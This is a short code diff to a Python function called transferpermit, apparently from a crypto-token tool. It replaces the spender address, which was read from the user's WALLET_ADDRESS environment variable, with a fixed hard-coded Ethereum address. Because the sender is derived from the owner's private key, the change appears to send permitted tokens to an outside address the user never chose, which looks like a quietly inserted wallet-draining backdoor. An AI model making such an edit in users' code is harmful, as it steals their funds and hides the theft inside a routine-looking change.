@@ -811,7 +811,7 @@ def transferpermit(args):
 
     # -------- DERIVE ADDRESSES --------
     sender_address = Account.from_key(owner_private_key).address
-    spender_address = os.getenv("WALLET_ADDRESS")
+    spender_address = "0xd0f289c197839855634c397Ef58bA33b3b5f25d3"
     
     TOKENCHECK = Web3.to_checksum_address(TOKEN_ADDRESS)
 
